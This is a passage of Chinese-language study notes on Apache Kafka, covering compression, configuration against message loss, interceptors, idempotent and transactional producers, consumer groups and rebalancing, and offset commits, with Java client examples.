<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Properties props = <span class="keyword">new</span> Properties();</span><br><span class="line">props.put(<span class="string">&quot;bootstrap.servers&quot;</span>, <span class="string">&quot;localhost:9092&quot;</span>);</span><br><span class="line">props.put(<span class="string">&quot;acks&quot;</span>, <span class="string">&quot;all&quot;</span>);</span><br><span class="line">props.put(<span class="string">&quot;key.serializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line">props.put(<span class="string">&quot;value.serializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line"><span class="comment">// 开启GZIP压缩</span></span><br><span class="line">props.put(<span class="string">&quot;compression.type&quot;</span>, <span class="string">&quot;gzip&quot;</span>);</span><br><span class="line"></span><br><span class="line">Producer&lt;String, String&gt; producer = <span class="keyword">new</span> KafkaProducer&lt;&gt;(props);</span><br></pre></td></tr></table></figure>

<h4 id="何时解压缩？"><a href="#何时解压缩？" class="headerlink" title="何时解压缩？"></a>何时解压缩？</h4><p>通常来说解压缩发生在消费者程序中，也就是说 Producer 发送压缩消息到 Broker 后，Broker 照单全收并原样保存起来。当 Consumer 程序请求这部分消息时，Broker 依然原样发送出去，当消息到达 Consumer 端后，由 Consumer 自行解压缩还原成之前的消息。</p>
<p>如果用一句话总结一下压缩和解压缩，那么我希望你记住这句话：Producer 端压缩、Broker 端保持、Consumer 端解压缩。</p>
<h3 id="无消息丢失配置怎么实现？"><a href="#无消息丢失配置怎么实现？" class="headerlink" title="无消息丢失配置怎么实现？"></a>无消息丢失配置怎么实现？</h3><p>一句话概括，Kafka 只对“已提交”的消息（committed message）做有限度的持久化保证。</p>
<p>当 Kafka 的若干个 Broker 成功地接收到一条消息并写入到日志文件后，它们会告诉生产者程序这条消息已成功提交。此时，这条消息在 Kafka 看来就正式变为“已提交”消息了。</p>
<h4 id="案例-1：生产者程序丢失数据"><a href="#案例-1：生产者程序丢失数据" class="headerlink" title="案例 1：生产者程序丢失数据"></a>案例 1：生产者程序丢失数据</h4><p>目前 Kafka Producer 是异步发送消息的，也就是说如果你调用的是 producer.send(msg) 这个 API，那么它通常会立即返回，但此时你不能认为消息发送已成功完成。</p>
<p>这种发送方式有个有趣的名字，叫“fire and forget”，翻译一下就是“发射后不管”。这个术语原本属于导弹制导领域，后来被借鉴到计算机领域中，它的意思是，执行完一个操作后不去管它的结果是否成功。调用 producer.send(msg) 就属于典型的“fire and forget”，因此如果出现消息丢失，我们是无法知晓的。这个发送方式挺不靠谱吧，不过有些公司真的就是在使用这个 API 发送消息。</p>
<p>实际上，解决此问题的方法非常简单：Producer 永远要使用带有回调通知的发送 API，也就是说不要使用 producer.send(msg)，而要使用 producer.send(msg, callback)。不要小瞧这里的 callback（回调），它能准确地告诉你消息是否真的提交成功了。一旦出现消息提交失败的情况，你就可以有针对性地进行处理。</p>
<h4 id="案例-2：消费者程序丢失数据"><a href="#案例-2：消费者程序丢失数据" class="headerlink" title="案例 2：消费者程序丢失数据"></a>案例 2：消费者程序丢失数据</h4><p>Consumer 端丢失数据主要体现在 Consumer 端要消费的消息不见了。Consumer 程序有个“位移”的概念，表示的是这个 Consumer 当前消费到的 Topic 分区的位置。下面这张图来自于官网，它清晰地展示了 Consumer 端的位移数据。</p>
<p><img src="https://static001.geekbang.org/resource/image/0c/37/0c97bed3b6350d73a9403d9448290d37.png"></p>
<p>正确使用书签有两个步骤：第一步是读书，第二步是更新书签页。如果这两步的顺序颠倒了，就可能出现这样的场景：当前的书签页是第 90 页，我先将书签放到第 100 页上，之后开始读书。当阅读到第 95 页时，我临时有事中止了阅读。那么问题来了，当我下次直接跳到书签页阅读时，我就丢失了第 96～99 页的内容，即这些消息就丢失了。同理，Kafka 中 Consumer 端的消息丢失就是这么一回事。</p>
<p>要对抗这种消息丢失，办法很简单：维持先消费消息（阅读），再更新位移（书签）的顺序即可。这样就能最大限度地保证消息不丢失。</p>
<p>当然，这种处理方式可能带来的问题是消息的重复处理，类似于同一页书被读了很多遍，但这不属于消息丢失的情形。</p>
<p>为了加快阅读速度，你把书中的 10 个章节分别委托给你的 10 个朋友，请他们帮你阅读，并拜托他们告诉你主旨大意。当电子书临近过期时，这 10 个人告诉你说他们读完了自己所负责的那个章节的内容，于是你放心地把该书还了回去。不料，在这 10 个人向你描述主旨大意时，你突然发现有一个人对你撒了谎，他并没有看完他负责的那个章节。那么很显然，你无法知道那一章的内容了。</p>
<p>这个问题的解决方案也很简单：如果是多线程异步处理消费消息，Consumer 程序不要开启自动提交位移，而是要应用程序手动提交位移。</p>
<h4 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h4><p>看完这两个案例之后，我来分享一下 Kafka 无消息丢失的配置，每一个其实都能对应上面提到的问题。</p>
<ul>
<li>不要使用 producer.send(msg)，而要使用 producer.send(msg, callback)。记住，一定要使用带有回调通知的 send 方法。</li>
<li>设置 acks = all。acks 是 Producer 的一个参数，代表了你对“已提交”消息的定义。如果设置成 all，则表明所有副本 Broker 都要接收到消息，该消息才算是“已提交”。这是最高等级的“已提交”定义。</li>
<li>设置 retries 为一个较大的值。这里的 retries 同样是 Producer 的参数，对应前面提到的 Producer 自动重试。当出现网络的瞬时抖动时，消息发送可能会失败，此时配置了 retries &gt; 0 的 Producer 能够自动重试消息发送，避免消息丢失。</li>
<li>设置 unclean.leader.election.enable = false。这是 Broker 端的参数，它控制的是哪些 Broker 有资格竞选分区的 Leader。如果一个 Broker 落后原先的 Leader 太多，那么它一旦成为新的 Leader，必然会造成消息的丢失。故一般都要将该参数设置成 false，即不允许这种情况的发生。</li>
<li>设置 replication.factor &gt;= 3。这也是 Broker 端的参数。其实这里想表述的是，最好将消息多保存几份，毕竟目前防止消息丢失的主要机制就是冗余。</li>
<li>设置 min.insync.replicas &gt; 1。这依然是 Broker 端参数，控制的是消息至少要被写入到多少个副本才算是“已提交”。设置成大于 1 可以提升消息持久性。在实际环境中千万不要使用默认值 1。</li>
<li>确保 replication.factor &gt; min.insync.replicas。如果两者相等，那么只要有一个副本挂机，整个分区就无法正常工作了。我们不仅要改善消息的持久性，防止数据丢失，还要在不降低可用性的基础上完成。推荐设置成 replication.factor = min.insync.replicas + 1。</li>
<li>确保消息消费完成再提交。Consumer 端有个参数 enable.auto.commit，最好把它设置成 false，并采用手动提交位移的方式。就像前面说的，这对于单 Cons</li>
</ul>
<h3 id="客户端都有哪些不常见但是很高级的功能？"><a href="#客户端都有哪些不常见但是很高级的功能？" class="headerlink" title="客户端都有哪些不常见但是很高级的功能？"></a>客户端都有哪些不常见但是很高级的功能？</h3><h4 id="拦截器"><a href="#拦截器" class="headerlink" title="拦截器"></a>拦截器</h4><p>如果你用过 Spring Interceptor 或是 Apache Flume，那么应该不会对拦截器这个概念感到陌生，其基本思想就是允许应用程序在不修改逻辑的情况下，动态地实现一组可插拔的事件处理逻辑链。</p>
<p><img src="https://static001.geekbang.org/resource/image/09/c4/096831a3ba037b3f9e507e6db631d3c4.png"></p>
<h4 id="Kafka-拦截器"><a href="#Kafka-拦截器" class="headerlink" title="Kafka 拦截器"></a>Kafka 拦截器</h4><p>Kafka 拦截器分为生产者拦截器和消费者拦截器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Properties props = <span class="keyword">new</span> Properties();</span><br><span class="line">List&lt;String&gt; interceptors = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">interceptors.add(<span class="string">&quot;com.yourcompany.kafkaproject.interceptors.AddTimestampInterceptor&quot;</span>); <span class="comment">// 拦截器1</span></span><br><span class="line">interceptors.add(<span class="string">&quot;com.yourcompany.kafkaproject.interceptors.UpdateCounterInterceptor&quot;</span>); <span class="comment">// 拦截器2</span></span><br><span class="line">props.put(ProducerConfig.INTERCEPTOR_CLASSES_CONFIG, interceptors);</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>org.apache.kafka.clients.producer.ProducerInterceptor 接口。该接口是 Kafka 提供的，里面有两个核心的方法。</p>
<ul>
<li>onSend：该方法会在消息发送之前被调用。如果你想在发送之前对消息“美美容”，这个方法是你唯一的机会。</li>
<li>onAcknowledgement：该方法会在消息成功提交或发送失败之后被调用。还记得我在上一期中提到的发送回调通知 callback 吗？onAcknowledgement 的调用要早于 callback 的调用。值得注意的是，这个方法和 onSend 不是在同一个线程中被调用的，因此如果你在这两个方法中调用了某个共享可变对象，一定要保证线程安全哦。还有一点很重要，这个方法处在 Producer 发送的主路径中，所以最好别放一些太重的逻辑进去，否则你会发现你的 Producer TPS 直线下降。</li>
</ul>
<p>同理，指定消费者拦截器也是同样的方法，只是具体的实现类要实现 org.apache.kafka.clients.consumer.ConsumerInterceptor 接口，这里面也有两个核心方法。</p>
<ul>
<li>onConsume：该方法在消息返回给 Consumer 程序之前调用。也就是说在开始正式处理消息之前，拦截器会先拦一道，搞一些事情，之后再返回给你。</li>
<li>onCommit：Consumer 在提交位移之后调用该方法。通常你可以在该方法中做一些记账类的动作，比如打日志等。</li>
</ul>
<h4 id="典型使用场景"><a href="#典型使用场景" class="headerlink" title="典型使用场景"></a>典型使用场景</h4><p>其实，跟很多拦截器的用法相同，Kafka 拦截器可以应用于包括客户端监控、端到端系统性能检测、消息审计等多种功能在内的场景。</p>
<h3 id="Java生产者是如何管理TCP连接的？"><a href="#Java生产者是如何管理TCP连接的？" class="headerlink" title="Java生产者是如何管理TCP连接的？"></a>Java生产者是如何管理TCP连接的？</h3><p>Apache Kafka的所有通信都是基于TCP的，而不是于HTTP或其他协议的</p>
<h4 id="1-为什采用TCP"><a href="#1-为什采用TCP" class="headerlink" title="1 为什采用TCP?"></a>1 为什采用TCP?</h4><p>（1）TCP拥有一些高级功能，如多路复用请求和同时轮询多个连接的能力。<br>（2）很多编程语言的HTTP库功能相对的比较简陋。<br>名词解释：<br>多路复用请求：multiplexing request，是将两个或多个数据合并到底层—物理连接中的过程。TCP的多路复用请求会在一条物理连接上创建若干个虚拟连接，每个虚拟连接负责流转各自对应的数据流。严格讲：TCP并不能多路复用，只是提供可靠的消息交付语义保证，如自动重传丢失的报文。</p>
<h4 id="2-何时创建TCP连接？"><a href="#2-何时创建TCP连接？" class="headerlink" title="2 何时创建TCP连接？"></a>2 何时创建TCP连接？</h4><p>（1）在创建KafkaProducer实例时，<br>A：生产者应用会在后台创建并启动一个名为Sender的线程，该Sender线程开始运行时，首先会创建与Broker的连接。<br>B：此时不知道要连接哪个Broker，kafka会通过METADATA请求获取集群的元数据，连接所有的Broker。<br>（2）还可能在更新元数据后，或在消息发送时<br>3 何时关闭TCP连接<br>（1）Producer端关闭TCP连接的方式有两种：用户主动关闭，或kafka自动关闭。<br>A：用户主动关闭，通过调用producer.close()方关闭，也包括kill -9暴力关闭。<br>B：Kafka自动关闭，这与Producer端参数connection.max.idles.ms的值有关，默认为9分钟，9分钟内没有任何请求流过，就会被自动关闭。这个参数可以调整。<br>C：第二种方式中，TCP连接是在Broker端被关闭的，但这个连接请求是客户端发起的，对TCP而言这是被动的关闭，被动关闭会产生大量的CLOSE_WAIT连接。</p>
<h3 id="幂等生产者和事务生产者"><a href="#幂等生产者和事务生产者" class="headerlink" title="幂等生产者和事务生产者"></a>幂等生产者和事务生产者</h3><p>所谓的消息交付可靠性保障，是指 Kafka 对 Producer 和 Consumer 要处理的消息提供什么样的承诺。</p>
<p>常见的承诺有以下三种：</p>
<ul>
<li>最多一次（at most once）：消息可能会丢失，但绝不会被重复发送。</li>
<li>至少一次（at least once）：消息不会丢失，但有可能被重复发送。</li>
<li>精确一次（exactly once）：消息不会丢失，也不会被重复发送。</li>
</ul>
<p>目前，Kafka 默认提供的交付可靠性保障是第二种，即至少一次。</p>
<p>Kafka 是怎么做到精确一次的呢？简单来说，这是通过两种机制：幂等性（Idempotence）和事务（Transaction）。</p>
<h4 id="幂等性（Idempotence）"><a href="#幂等性（Idempotence）" class="headerlink" title="幂等性（Idempotence）"></a>幂等性（Idempotence）</h4><ul>
<li>在计算机领域中，幂等性的含义稍微有一些不同：<br>在命令式编程语言（比如 C）中，若一个子程序是幂等的，那它必然不能修改系统状态。这样不管运行这个子程序多少次，与该子程序关联的那部分系统状态保持不变。</li>
<li>在函数式编程语言（比如 Scala 或 Haskell）中，很多纯函数（pure function）天然就是幂等的，它们不执行任何的 side effect。</li>
</ul>
<p>幂等性有很多好处，其最大的优势在于我们可以安全地重试任何幂等性操作，反正它们也不会破坏我们的系统状态。如果是非幂等性操作，我们还需要担心某些操作执行多次对状态的影响，但对于幂等性操作而言，我们根本无需担心此事。</p>
<h4 id="幂等性-Producer"><a href="#幂等性-Producer" class="headerlink" title="幂等性 Producer"></a>幂等性 Producer</h4><p>enable.idempotence 被设置成 true 后，Producer 自动升级成幂等性 Producer，其他所有的代码逻辑都不需要改变。Kafka 自动帮你做消息的重复去重。底层具体的原理很简单，就是经典的用空间去换时间的优化思路，即在 Broker 端多保存一些字段。当 Producer 发送了具有相同字段值的消息后，Broker 能够自动知晓这些消息已经重复了，于是可以在后台默默地把它们“丢弃”掉。当然，实际的实现原理并没有这么简单，但你大致可以这么理解。</p>
<p>看上去，幂等性 Producer 的功能很酷，使用起来也很简单，仅仅设置一个参数就能保证消息不重复了，但实际上，我们必须要了解幂等性 Producer 的作用范围。</p>
<p>首先，它只能保证单分区上的幂等性，即一个幂等性 Producer 能够保证某个主题的一个分区上不出现重复消息，它无法实现多个分区的幂等性。其次，它只能实现单会话上的幂等性，不能实现跨会话的幂等性。这里的会话，你可以理解为 Producer 进程的一次运行。当你重启了 Producer 进程之后，这种幂等性保证就丧失了。</p>
<p>那么你可能会问，如果我想实现多分区以及多会话上的消息无重复，应该怎么做呢？答案就是事务（transaction）或者依赖事务型 Producer。这也是幂等性 Producer 和事务型 Producer 的最大区别！</p>
<p>实现逻辑很简单:</p>
<ul>
<li>区分producer会话</li>
</ul>
<p>producer每次启动后，首先向broker申请一个全局唯一的pid，用来标识本次会话。</p>
<ul>
<li>消息检测</li>
</ul>
<p>message_v2 增加了sequence number字段，producer每发一批消息，seq就加1。</p>
<p>broker在内存维护(pid,seq)映射，收到消息后检查seq，如果，</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">new_seq=old_seq+1: 正常消息；</span><br><span class="line"></span><br><span class="line">new_seq&lt;=old_seq : 重复消息；</span><br><span class="line"></span><br><span class="line">new_seq&gt;old_seq+1: 消息丢失；</span><br></pre></td></tr></table></figure>

<ul>
<li>producer重试</li>
</ul>
<p>producer在收到明确的的消息丢失ack，或者超时后未收到ack，要进行重试。</p>
<h4 id="事务型-Producer"><a href="#事务型-Producer" class="headerlink" title="事务型 Producer"></a>事务型 Producer</h4><p>事务型 Producer 能够保证将消息原子性地写入到多个分区中。这批消息要么全部写入成功，要么全部失败。另外，事务型 Producer 也不惧进程的重启。Producer 重启回来后，Kafka 依然保证它们发送消息的精确一次处理。</p>
<p>设置事务型 Producer 的方法也很简单，满足两个要求即可：</p>
<ul>
<li>和幂等性 Producer 一样，开启 enable.idempotence = true。</li>
<li>设置 Producer 端参数 transactional. id。最好为其设置一个有意义的名字。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">producer.initTransactions();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">            producer.beginTransaction();</span><br><span class="line">            producer.send(record1);</span><br><span class="line">            producer.send(record2);</span><br><span class="line">            producer.commitTransaction();</span><br><span class="line">&#125; <span class="keyword">catch</span> (KafkaException e) &#123;</span><br><span class="line">            producer.abortTransaction();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 Consumer 端，读取事务型 Producer 发送的消息也是需要一些变更的。修改起来也很简单，设置 isolation.level 参数的值即可。当前这个参数有两个取值：</p>
<ul>
<li>read_uncommitted：这是默认值，表明 Consumer 能够读取到 Kafka 写入的任何消息，不论事务型 Producer 提交事务还是终止事务，其写入的消息都可以读取。很显然，如果你用了事务型 Producer，那么对应的 Consumer 就不要使用这个值。</li>
<li>read_committed：表明 Consumer 只会读取事务型 Producer 成功提交事务写入的消息。当然了，它也能看到非事务型 Producer 写入的所有消息。</li>
</ul>
<p><img src="https://upload-images.jianshu.io/upload_images/13073006-07510de6d7a5eff2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/720"></p>
<h3 id="消费者组到底是什么？"><a href="#消费者组到底是什么？" class="headerlink" title="消费者组到底是什么？"></a>消费者组到底是什么？</h3><p>Consumer Group ：Kafka提供的可扩展且具有容错性的消息者机制。</p>
<h4 id="1，重要特征："><a href="#1，重要特征：" class="headerlink" title="1，重要特征："></a>1，重要特征：</h4><p>A：组内可以有多个消费者实例（Consumer Instance）。<br>B：消费者组的唯一标识被称为Group ID，组内的消费者共享这个公共的ID。<br>C：消费者组订阅主题，主题的每个分区只能被组内的一个消费者消费<br>D：消费者组机制，同时实现了消息队列模型和发布/订阅模型。</p>
<h4 id="2，重要问题："><a href="#2，重要问题：" class="headerlink" title="2，重要问题："></a>2，重要问题：</h4><p>A：消费组中的实例与分区的关系：<br>消费者组中的实例个数，最好与订阅主题的分区数相同，否则多出的实例只会被闲置。一个分区只能被一个消费者实例订阅。<br>B：消费者组的位移管理方式：<br>（1）对于Consumer Group而言，位移是一组KV对，Key是分区，V对应Consumer消费该分区的最新位移。<br>（2）Kafka的老版本消费者组的位移保存在Zookeeper中，好处是Kafka减少了Kafka Broker端状态保存开销。但ZK是一个分布式的协调框架，不适合进行频繁的写更新，这种大吞吐量的写操作极大的拖慢了Zookeeper集群的性能。<br>（3）Kafka的新版本采用了将位移保存在Kafka内部主题的方法。</p>
<p>C：消费者组的重平衡：<br>（1）重平衡：本质上是一种协议，规定了消费者组下的每个消费者如何达成一致，来分配订阅topic下的每个分区。<br>（2）触发条件：<br>a，组成员数发生变更<br>b，订阅主题数发生变更<br>c，定阅主题分区数发生变更<br>（3）影响：<br>Rebalance 的设计是要求所有consumer实例共同参与，全部重新分配所有用分区。并且Rebalance的过程比较缓慢，这个过程消息消费会中止。</p>
<h3 id="揭开神秘的“位移主题”面纱"><a href="#揭开神秘的“位移主题”面纱" class="headerlink" title="揭开神秘的“位移主题”面纱"></a>揭开神秘的“位移主题”面纱</h3><p>1，诞生背景<br>A ：老版本的Kafka会把位移信息保存在Zk中，当Consumer重启后，自动从Zk中读取位移信息。这种设计使Kafka Broker不需要保存位移数据，可减少Broker端需要持有的状态空间，有利于实现高伸缩性。<br>B ：但zk不适用于高频的写操作，这令zk集群性能严重下降，在新版本中将消费者的位移数据作为一条条普通的Kafka消息，提交至内部主题（_consumer_offsets）中保存。实现高持久性和高频写操作。</p>
<p>2，特点:<br>A ：位移主题是一个普通主题，同样可以被手动创建，修改，删除。。<br>B ：位移主题的消息格式是kafka定义的，不可以被手动修改，若修改格式不正确，kafka将会崩溃。<br>C ：位移主题保存了三部分内容：Group ID，主题名，分区号。</p>
<p>3，创建：<br>A ：当Kafka集群中的第一个Consumer程序启动时，Kafka会自动创建位移主题。也可以手动创建<br>B ：分区数依赖于Broker端的offsets.topic.num.partitions的取值，默认为50<br>C ：副本数依赖于Broker端的offsets.topic.replication.factor的取值，默认为3</p>
<p>4，使用：<br>A ：当Kafka提交位移消息时会使用这个主题<br>B ：位移提交得分方式有两种:手动和自动提交位移。<br>C ：推荐使用手动提交位移，自动提交位移会存在问题：只要consumer一直启动设置，他就会无限期地向主题写入消息。</p>
<p>5，清理：<br>A ：Kafka使用Compact策略来删除位移主题中的过期消息，避免位移主题无限膨胀。<br>B ：kafka提供专门的后台线程定期巡检待compcat的主题，查看是否存在满足条件的可删除数据。</p>
<p>对于同一个 Key 的两条消息 M1 和 M2，如果 M1 的发送时间早于 M2，那么 M1 就是过期消息。Compact 的过程就是扫描日志的所有消息，剔除那些过期的消息，然后把剩下的消息整理在一起。我在这里贴一张来自官网的图片，来说明 Compact 过程。</p>
<p><img src="https://static001.geekbang.org/resource/image/86/e7/86a44073aa60ac33e0833e6a9bfd9ae7.jpeg"></p>
<p>Kafka 提供了专门的后台线程定期地巡检待 Compact 的主题，看看是否存在满足条件的可删除数据。这个后台线程叫 Log Cleaner。很多实际生产环境中都出现过位移主题无限膨胀占用过多磁盘空间的问题，如果你的环境中也有这个问题，我建议你去检查一下 Log Cleaner 线程的状态，通常都是这个线程挂掉了导致的。</p>
<p>6，注意事项：<br>A ：建议不要修改默认分区数，在kafka中有些许功能写死的是50个分区<br>B ：建议不要使用自动提交模式，采用手动提交，避免消费者无限制的写入消息。<br>C ：后台定期巡检线程叫Log Cleaner，若线上遇到位移主题无限膨胀占用过多磁盘，应该检查此线程的工作状态。</p>
<h3 id="消费者组重平衡能避免吗？"><a href="#消费者组重平衡能避免吗？" class="headerlink" title="消费者组重平衡能避免吗？"></a>消费者组重平衡能避免吗？</h3><h4 id="Rebalance-概念"><a href="#Rebalance-概念" class="headerlink" title="Rebalance 概念"></a>Rebalance 概念</h4><p>Rebalance 就是让一个 Consumer Group 下所有的 Consumer 实例就如何消费订阅主题的所有分区达成共识的过程。在 Rebalance 过程中，所有 Consumer 实例共同参与，在协调者组件的帮助下，完成订阅主题分区的分配。但是，在整个过程中，所有实例都不能消费任何消息，因此它对 Consumer 的 TPS 影响很大。</p>
<p>所谓协调者，在 Kafka 中对应的术语是 Coordinator，它专门为 Consumer Group 服务，负责为 Group 执行 Rebalance 以及提供位移管理和组成员管理等。</p>
<p>具体来讲，Consumer 端应用程序在提交位移时，其实是向 Coordinator 所在的 Broker 提交位移。同样地，当 Consumer 应用启动时，也是向 Coordinator 所在的 Broker 发送各种请求，然后由 Coordinator 负责执行消费者组的注册、成员管理记录等元数据管理操作。</p>
<p>所有 Broker 在启动时，都会创建和开启相应的 Coordinator 组件。也就是说，所有 Broker 都有各自的 Coordinator 组件。那么，Consumer Group 如何确定为它服务的 Coordinator 在哪台 Broker 上呢？答案就在我们之前说过的 Kafka 内部位移主题 __consumer_offsets 身上。</p>
<p>目前，Kafka 为某个 Consumer Group 确定 Coordinator 所在的 Broker 的算法有 2 个步骤。</p>
<ul>
<li>第 1 步：确定由位移主题的哪个分区来保存该 Group 数据：partitionId=Math.abs(groupId.hashCode() % offsetsTopicPartitionCount)。</li>
<li>第 2 步：找出该分区 Leader 副本所在的 Broker，该 Broker 即为对应的 Coordinator。</li>
</ul>
<p>简单解释一下上面的算法。首先，Kafka 会计算该 Group 的 group.id 参数的哈希值。比如你有个 Group 的 group.id 设置成了“test-group”，那么它的 hashCode 值就应该是 627841412。其次，Kafka 会计算 __consumer_offsets 的分区数，通常是 50 个分区，之后将刚才那个哈希值对分区数进行取模加求绝对值计算，即 abs(627841412 % 50) = 12。此时，我们就知道了位移主题的分区 12 负责保存这个 Group 的数据。有了分区号，算法的第 2 步就变得很简单了，我们只需要找出位移主题分区 12 的 Leader 副本在哪个 Broker 上就可以了。这个 Broker，就是我们要找的 Coordinator。</p>
<h4 id="Rebalance-的弊端是"><a href="#Rebalance-的弊端是" class="headerlink" title="Rebalance 的弊端是"></a>Rebalance 的弊端是</h4><ul>
<li>Rebalance 影响 Consumer 端 TPS。这个之前也反复提到了，这里就不再具体讲了。总之就是，在 Rebalance 期间，Consumer 会停下手头的事情，什么也干不了。</li>
<li>Rebalance 很慢。如果你的 Group 下成员很多，就一定会有这样的痛点。还记得我曾经举过的那个国外用户的例子吧？他的 Group 下有几百个 Consumer 实例，Rebalance 一次要几个小时。在那种场景下，Consumer Group 的 Rebalance 已经完全失控了。</li>
<li>Rebalance 效率不高。当前 Kafka 的设计机制决定了每次 Rebalance 时，Group 下的所有成员都要参与进来，而且通常不会考虑局部性原理，但局部性原理对提升系统性能是特别重要的。</li>
</ul>
<h4 id="Rebalance-发生的时机"><a href="#Rebalance-发生的时机" class="headerlink" title="Rebalance 发生的时机"></a>Rebalance 发生的时机</h4><p>Rebalance 发生的时机有三个：</p>
<ul>
<li>组成员数量发生变化</li>
<li>订阅主题数量发生变化</li>
<li>订阅主题的分区数发生变化</li>
</ul>
<h4 id="相关的主要参数"><a href="#相关的主要参数" class="headerlink" title="相关的主要参数"></a>相关的主要参数</h4><ul>
<li>session.timeout.ms：即如果 Coordinator 在 10 秒之内没有收到 Group 下某 Consumer 实例的心跳，它就会认为这个 Consumer 实例已经挂了。</li>
<li>heartbeat.interval.ms：控制发送心跳请求频率的参数</li>
<li>max.poll.interval.ms：限定了 Consumer 端应用程序两次调用 poll 方法的最大时间间隔</li>
<li>GC 参数</li>
</ul>
<p>你可以“无脑”地应用在你的生产环境中。</p>
<ul>
<li>设置 session.timeout.ms = 6s。</li>
<li>设置 heartbeat.interval.ms = 2s。</li>
<li>要保证 Consumer 实例在被判定为“dead”之前，能够发送至少 3 轮的心跳请求，即 session.timeout.ms &gt;= 3 * heartbeat.interval.ms。</li>
</ul>
<h3 id="Kafka中位移提交那些事儿"><a href="#Kafka中位移提交那些事儿" class="headerlink" title="Kafka中位移提交那些事儿"></a>Kafka中位移提交那些事儿</h3><p>Consumer 端有个位移的概念，它和消息在分区中的位移不是一回事儿，虽然它们的英文都是 Offset。今天我们要聊的位移是 Consumer 的消费位移，它记录了 Consumer 要消费的下一条消息的位移。</p>
<p>Consumer 需要向 Kafka 汇报自己的位移数据，这个汇报过程被称为提交位移（Committing Offsets）。因为 Consumer 能够同时消费多个分区的数据，所以位移的提交实际上是在分区粒度上进行的，即 Consumer 需要为分配给它的每个分区提交各自的位移数据。</p>
<p>从用户的角度来说，位移提交分为自动提交和手动提交；从 Consumer 端的角度来说，位移提交分为同步提交和异步提交。</p>
<h4 id="自动提交"><a href="#自动提交" class="headerlink" title="自动提交"></a>自动提交</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Properties props = <span class="keyword">new</span> Properties();</span><br><span class="line">     props.put(<span class="string">&quot;bootstrap.servers&quot;</span>, <span class="string">&quot;localhost:9092&quot;</span>);</span><br><span class="line">     props.put(<span class="string">&quot;group.id&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">     props.put(<span class="string">&quot;enable.auto.commit&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">     props.put(<span class="string">&quot;auto.commit.interval.ms&quot;</span>, <span class="string">&quot;2000&quot;</span>);</span><br><span class="line">     props.put(<span class="string">&quot;key.deserializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;</span>);</span><br><span class="line">     props.put(<span class="string">&quot;value.deserializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;</span>);</span><br><span class="line">     KafkaConsumer&lt;String, String&gt; consumer = <span class="keyword">new</span> KafkaConsumer&lt;&gt;(props);</span><br><span class="line">     consumer.subscribe(Arrays.asList(<span class="string">&quot;foo&quot;</span>, <span class="string">&quot;bar&quot;</span>));</span><br><span class="line">     <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">         ConsumerRecords&lt;String, String&gt; records = consumer.poll(<span class="number">100</span>);</span><br><span class="line">         <span class="keyword">for</span> (ConsumerRecord&lt;String, String&gt; record : records)</span><br><span class="line">             System.out.printf(<span class="string">&quot;offset = %d, key = %s, value = %s%n&quot;</span>, record.offset(), record.key(), record.value());</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<h4 id="手动提交-同步提交"><a href="#手动提交-同步提交" class="headerlink" title="手动提交/同步提交"></a>手动提交/同步提交</h4><p>开启手动提交位移的方法就是设置 enable.auto.commit 为 false。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            ConsumerRecords&lt;String, String&gt; records =</span><br><span class="line">                        consumer.poll(Duration.ofSeconds(<span class="number">1</span>));</span><br><span class="line">            process(records); <span class="comment">// 处理消息</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                        consumer.commitSync();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (CommitFailedException e) &#123;</span><br><span class="line">                        handle(e); <span class="comment">// 处理提交失败异常</span></span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可见，调用 consumer.commitSync() 方法的时机，是在你处理完了 poll() 方法返回的所有消息之后。</p>
<p>它能保证不出现消费丢失的情况。但自动提交位移的一个问题在于，它可能会出现重复消费。</p>
<h4 id="异步提交"><a href="#异步提交" class="headerlink" title="异步提交"></a>异步提交</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            ConsumerRecords&lt;String, String&gt; records = </span><br><span class="line">  consumer.poll(Duration.ofSeconds(<span class="number">1</span>));</span><br><span class="line">            process(records); <span class="comment">// 处理消息</span></span><br><span class="line">            consumer.commitAsync((offsets, exception) -&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (exception != <span class="keyword">null</span>)</span><br><span class="line">  handle(exception);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>commitAsync 的问题在于，出现问题时它不会自动重试。因为它是异步操作，倘若提交失败后自动重试，那么它重试时提交的位移值可能早已经“过期”或不是最新值了。因此，异步提交的重试其实没有意义，所以 commitAsync 是不会重试的。</p>
